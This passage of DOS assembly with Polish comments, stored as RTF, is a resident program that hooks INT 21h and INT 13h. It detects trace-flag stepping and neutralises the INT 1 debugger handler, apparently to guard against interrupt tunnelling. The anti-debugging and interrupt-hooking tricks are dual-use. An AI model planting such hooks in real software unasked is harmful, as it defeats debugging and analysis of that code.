\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   ax,2513h                       ; funkcja DOS - ustaw nowe przerwanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      int   21h                            ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      push  cs}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      pop   es                             ; ES=zwalniany segment}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   ah,49h                         ; funkcja DOS - zwolnij blok pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      int   21h                            ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      pop   ds es                          ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   ax,bp                          ; przekaz informacje do wywolujacego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                           ; programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      iret                                 ; powrot z przerwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nie3521:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Call  Wylacz_TF                      ; jezeli bit TF=1, ustaw TF=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 db 0EAh                   ; czesc rozkazu JMP FAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      StareInt21 dd ?                      ; koncowka rozkazu JMP FAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NoweInt13h:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Call  Wylacz_TF                      ; jezeli TF=1, ustaw TF=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                 db 0EAh                   ; czesc rozkazu JMP FAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      StareInt13 dd ?                      ; koncowka rozkazu JMP FAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wylacz_TF:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      cli                                  ; zablokuj przerwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      push  ax bx ds                       ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      push  ss                             ; \\  za pomoca tej sztuczki zwykle}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      pop   ss                             ;  \\ mozna pobrac "prawdziwy" obraz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      pushf                                ;  / rejestru znacznikow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      pop   ax                             ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      test  ah,1                           ; czy TF ustawiony ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      jz    TF_NieUstawiony                ; NIE - nie trzeba nic robic}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   ax,0123h                       ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      push  ax                             ; ss:[sp]:=0123}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      pop   ax                             ; ax:=ss:[sp]:=0123}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      dec   sp                             ; sp=sp-2-wskazuje na wartosc,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      dec   sp                             ; ktora byla sciagana ze stosu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      pop   ax                             ; ax:=ss:[sp]:=0123 jezeli TF=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      cmp   ax,0123h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      jz    TF_NieUstawiony                ; NIE - nie trzeba nic robic}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      xor   ax,ax                          ; \\ DS wskazuje na tablice przerwan}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   ds,ax                          ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      lds   bx,ds:[01h*4]                  ; DS:BX wskazuje na adres obslugi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                           ; przerwania krokowego INT 1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   al,0CFh                        ; kod 0CFh oznacza IRET}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      xchg  al,ds:[bx]                     ; wymien pierwszy bajt w procedurze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                           ; obslugi INT 1 - teraz jest tylko}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                           ; IRET}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      push  ax                             ; zachowaj pierwszy bajt procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      pushf                                ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      pop   ax                             ;  \\  zeruj TF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      and   ah,0FEh                        ;   -}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      push  ax                             ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      popf                                 ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      pop  ax                              ; przywroc pierwszy bajt}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov  ds:[bx],al                      ; i zapisz go z powrotem}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TF_NieUstawiony:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      pop  ds bx ax                        ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      ret                                  ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KoniecKoduTSR:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poczatek:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   es,ds:[2Ch]                    ; ES=blok otoczenia programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   ah,49h                         ; funkcja DOS - zwolnij blok pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      int   21h                            ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      lea   si,TeCopyRight                 ; \\ pokaz info o programie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Call  Print                          ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   bp,0BACAh                      ; \\  wez stare INT 21h i jednoczesnie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   ax,3521h                       ;  - odinstaluj program, jezeli juz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      int   21h                            ; /  byl wczesniej zainstalowany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      cmp   ax,0BACAh                      ; czy zostal odinstalowany ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      je    Deinstal                       ; TAK - wyswietl komunikat i koncz}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   word ptr [StareInt21],bx       ; \\ zachowaj stare INT 21}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   word ptr [StareInt21+2],es     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   ax,3513h                       ; funkcja DOS - wez stare INT 13h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      int   21h                            ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   word ptr [StareInt13],bx       ; \\ zachowaj stare INT 13}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   word ptr [StareInt13+2],es     ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      lea   si,TeZainstalowany             ; \\ pokaz info o programie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Call  Print                          ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      lea   dx,NoweInt21h                  ; DS:DX wskazuje na nowa procedure}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   ax,2521h                       ; funkcja DOS - ustaw nowa INT 21}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      int   21h                            ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      lea   dx,NoweInt13h                  ; DS:DX wskazuje na nowa procedure}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   ax,2513h                       ; funkcja DOS - ustaw nowa INT 13}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      int   21h                            ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   dx,DlugoscKoduTSR              ; ile kodu zostanie jako TSR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   ah,31h                         ; funkcja DOS - koncz i zostaw TSR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      int   21h                            ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Deinstal:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      lea   si,TeOdinstalowany             ; \\ pokaz info o deinstalacji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Call  Print                          ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      mov   ax, 4C00h                      ; funkcja DOS - koncz program}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      int   21h                            ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Print proc near                           ; procedura wyswietla tekst ASCIIZ}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                           ; spod adresu CS:SI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                        ; \\ zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push si                        ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch GetNextChar:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            lods byte ptr cs:[si]          ; wez kolejny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            or al,al                       ; czy znak jest zerem ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jz PrintExit                   ; tak=koniec napisu; wyjdz z petli}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            Call PrintChar                 ; nie=wyswietl znak w AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                           ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            jmp short GetNextChar          ; i wez nastepny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrintExit:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  si                        ; \\ przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ax                        ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                            ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Print endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrintChar proc near                       ; procedura wyswietla znak w AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            push ax                        ; zachowaj zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            mov  ah,0Eh                    ; funkcja BIOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            int  10h                       ; wyswietl znak w AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            pop  ax                        ; przywroc zmieniany rejestr}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch            ret                            ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
